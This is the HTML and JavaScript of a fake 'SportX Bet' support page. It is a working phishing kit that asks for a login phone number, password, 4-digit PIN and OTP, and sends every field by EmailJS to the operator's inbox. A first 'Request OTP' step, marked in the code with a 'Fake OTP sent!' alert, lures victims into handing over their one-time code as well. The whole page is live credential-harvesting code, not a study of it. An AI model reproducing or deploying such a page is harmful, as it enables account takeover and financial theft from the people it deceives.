<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Support - SportX Bet</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, Helvetica, sans-serif;
}

body{
    background:#0f172a;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding:20px;
}

.login-box{
    background:#1f2937;
    padding:30px;
    border-radius:12px;
    width:100%;
    max-width:350px;
    color:white;
}

.login-box h2{
    text-align:center;
    margin-bottom:25px;
}

input{
    width:100%;
    padding:12px;
    margin-bottom:15px;
    border:none;
    border-radius:8px;
}

button{
    width:100%;
    padding:12px;
    background:#22c55e;
    border:none;
    border-radius:8px;
    font-weight:bold;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    opacity:0.9;
}
</style>
</head>

<body>

<div class="login-box">
    <h2>join us today</h2>

    <form id="support-form">
        <input type="number" name="login_phonenumber" placeholder="login phone" required>
        <input type="password" name="login_password" placeholder="login password" required>
        <input type="number" name="user_4_digit_pin" placeholder="4 digit pin" required>
        <input type="number" name="OTP" placeholder="OTP" >
        <button id="support-btn" type="submit">Request Otp</button>
    </form>

</div>

<script>
(function(){
    emailjs.init("oxoB98Mo4X0yE3EGQ");
})();

const form = document.getElementById("support-form");
const button = document.getElementById("support-btn");

let step = 1;
let countdownInterval;

form.addEventListener("submit", function(event) {
    event.preventDefault();

    if (step === 1) {
        // STEP 1 → Request OTP

        button.disabled = true;
        button.textContent = "Sending OTP...";

        emailjs.sendForm(
            "service_kx951jl",
            "template_cgia2or",   // OTP template
            form
        ).then(function() {

            alert("Fake OTP sent!");
            startCountdown();
            step = 2;

        }).catch(function(error) {
            console.log(error);
            alert("Failed to send OTP");
            button.disabled = false;
            button.textContent = "Request OTP";
        });

    } else if (step === 2) {
        // STEP 2 → Submit full form with OTP

        button.disabled = true;
        button.textContent = "Submitting...";

        emailjs.sendForm(
            "service_kx951jl",
            "template_cgia2or",  // second template
            form
        ).then(function() {

            alert("Form sent successfully!");
            form.reset();
            resetButton();

        }).catch(function(error) {
            console.log(error);
            alert("Submission failed");
            button.disabled = false;
            button.textContent = "Submit";
        });
    }
});

function startCountdown() {
    let time = 60;

    button.textContent = `Wait ${time}s`;

    countdownInterval = setInterval(() => {
        time--;
        button.textContent = `Wait ${time}s`;

        if (time <= 0) {
            clearInterval(countdownInterval);
            button.disabled = false;
            button.textContent = "Submit OTP";
        }
    }, 1000);
}

function resetButton() {
    step = 1;
    button.disabled = false;
    button.textContent = "Request OTP";
}
</script>

</body>
</html>
